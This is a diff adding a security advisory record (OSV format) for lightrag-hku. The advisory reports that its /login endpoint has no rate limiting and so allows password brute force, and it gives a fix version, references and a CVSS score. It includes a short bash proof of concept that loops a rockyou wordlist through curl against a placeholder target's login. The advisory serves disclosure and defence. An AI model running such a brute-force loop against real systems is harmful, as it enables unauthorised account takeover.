@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-frch-4w6v-q5xx",
+  "modified": "2026-09-22T20:40:22Z",
+  "published": "2026-09-22T20:40:22Z",
+  "aliases": [
+    "CVE-2026-85734"
+  ],
+  "summary": "lightrag-hku: No Rate Limiting on /login Endpoint Allows Brute-Force Attacks",
+  "details": "### Summary\nThe POST /login endpoint has no rate limiting, account lockout, or delay on failed attempts. An attacker can submit unlimited password guesses at full network speed.\n\n### Details\n\n```python\n# lightrag/api/lightrag_server.py:2161\n@app.post(\"/login\")\nasync def login(form_data: OAuth2PasswordRequestForm = Depends()):\n    if not auth_handler.verify_password(username, form_data.password):\n        raise HTTPException(status_code=401, detail=\"Incorrect credentials\")\n    # No: rate limit / lockout / backoff / CAPTCHA / attempt counter\n```\n\nA search for slowapi, rate_limit, lockout, or throttle in lightrag/api/ returns zero results.\n\n### PoC\n\n```bash\n# Brute-force /login with a wordlist, no throttling\nwhile IFS= read -r pass; do\n  code=$(curl -s -o /dev/null -w \"%{http_code}\" \\\n    -X POST http://<TARGET>:9621/login \\\n    -d \"username=admin&password=${pass}\")\n  [ \"$code\" = \"200\" ] && echo \"[FOUND] $pass\" && break\ndone < /usr/share/wordlists/rockyou.txt\n```\n\n### Impact\nImproper restriction of authentication attempts. Any network-reachable attacker can brute-force user passwords without restriction. Once credentials are recovered, the attacker gains full authenticated access to all documents, knowledge graph, and administrative operations.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "lightrag-hku"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.5.5"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-frch-4w6v-q5xx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85734"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/pull/3424"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/commit/135bc9056e9ecd800c1abe2f2ce24d1a86622a54"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HKUDS/LightRAG"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.5"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-307"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-22T20:40:22Z",
+    "nvd_published_at": "2026-09-22T17:17:27Z"
+  }
+}
